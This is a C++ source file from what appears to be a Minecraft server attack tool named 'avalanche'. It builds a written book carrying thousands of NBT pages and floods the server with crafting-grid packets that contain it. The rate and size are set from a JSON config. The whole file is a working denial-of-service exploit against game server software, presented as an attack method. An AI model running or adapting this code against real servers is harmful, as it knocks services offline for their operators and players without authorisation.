#include "AttackRecipe.h"

#include <mclib/util/Utility.h>

namespace avalanche {

const char* AttackRecipe::s_Name = "recipe";
s32 AttackRecipe::s_BookPages = 3000;
s32 AttackRecipe::s_SendPerTick = 1;
s32 AttackRecipe::s_ReturnCount = 1;
s32 AttackRecipe::s_PrepareCount = 1;
mc::inventory::Slot AttackRecipe::s_AttackItem;

AttackRecipe::AttackRecipe(mc::core::Client* client)
    : mc::protocol::packets::PacketHandler(client->GetDispatcher()),
    m_Client(client),
    m_TransactionIndex(1),
    m_Finished(false),
    m_Transaction(false)
{

}

AttackRecipe::~AttackRecipe() {

}

void AttackRecipe::HandlePacket(mc::protocol::packets::in::ConfirmTransactionPacket* packet) {
    m_Transaction = false;
}

void AttackRecipe::OnCreate() {
    m_Client->RegisterListener(this);
    GetDispatcher()->RegisterHandler(mc::protocol::State::Play, mc::protocol::play::ConfirmTransaction, this);

    m_Finished = false;
    m_Transaction = false;
}

void AttackRecipe::OnDestroy() {
    m_Client->UnregisterListener(this);
    GetDispatcher()->UnregisterHandler(this);
}

void AttackRecipe::CreateAttack() {
    mc::nbt::NBT nbt;
    auto tag = &nbt.GetRoot();

    tag->SetName(L"tag");

    mc::nbt::TagPtr generation = std::make_shared<mc::nbt::TagInt>(L"generation", 0);
    mc::nbt::TagPtr author = std::make_shared<mc::nbt::TagString>(L"author", L"aaaaaa");
    mc::nbt::TagPtr title = std::make_shared<mc::nbt::TagString>(L"title", L"bbbbbb");

    auto pages = std::make_shared<mc::nbt::TagList>(L"pages", mc::nbt::TagType::String);

    for (s32 i = 0; i < s_BookPages; ++i) {
        std::wstring pageText = L"t";
        pages->AddItem(std::make_shared<mc::nbt::TagString>(L"", pageText));
    }

    tag->AddItem(mc::nbt::TagType::Int, generation);
    tag->AddItem(mc::nbt::TagType::String, author);
    tag->AddItem(mc::nbt::TagType::String, title);
    tag->AddItem(mc::nbt::TagType::List, pages);

    mc::DataBuffer buffer;
    mc::inventory::Slot book(387, 1, 0, nbt);
    buffer << book;

    s_AttackItem = mc::inventory::Slot(387, 1, 0, nbt);
}

void AttackRecipe::OnTick() {
    // Only start doing the attack once the world data is received.
    if (!m_Client->GetWorld()->GetChunk(mc::ToVector3i(m_Client->GetPlayerController()->GetPosition())))
        return;

    static std::vector<mc::protocol::packets::out::PrepareCraftingGridPacket::Entry> returnEntries;
    static std::vector<mc::protocol::packets::out::PrepareCraftingGridPacket::Entry> prepareEntries;

    if (s_AttackItem.GetItemId() == -1) {
        CreateAttack();

        mc::protocol::packets::out::PrepareCraftingGridPacket::Entry entry;
        entry.craftingSlot = 0;
        entry.playerSlot = 0;
        entry.item = s_AttackItem;

        for (s32 i = 0; i < s_ReturnCount; ++i) {
            returnEntries.push_back(entry);
        }

        for (s32 i = 0; i < s_PrepareCount; ++i) {
            prepareEntries.push_back(entry);
        }
    }

    if (m_Transaction) return;

    for (s32 i = 0; i < s_SendPerTick; ++i) {
        mc::protocol::packets::out::PrepareCraftingGridPacket packet(0, m_TransactionIndex++, returnEntries, prepareEntries);
        m_Client->GetConnection()->SendPacket(&packet);

        m_Transaction = true;
    }

    m_Finished = true;
}

bool AttackRecipe::ReadJSON(const Json::Value& attackNode) {
    auto&& methodNode = attackNode["method"];
    if (!methodNode.isString() || methodNode.asString() != s_Name)
        return false;

    auto&& pagesNode = attackNode["pages"];
    if (!pagesNode.isNull()) {
        s_BookPages = pagesNode.asInt();
    }

    auto&& sendPerTickNode = attackNode["send-per-tick"];
    if (!sendPerTickNode.isNull()) {
        s_SendPerTick = sendPerTickNode.asInt();
    }

    auto&& returnCountNode = attackNode["return-count"];
    if (returnCountNode.isInt()) {
        s_ReturnCount = returnCountNode.asInt();
    }

    auto&& prepareCountNode = attackNode["prepare-count"];
    if (prepareCountNode.isInt()) {
        s_PrepareCount = prepareCountNode.asInt();
    }

    return true;
}

} // ns avalanche
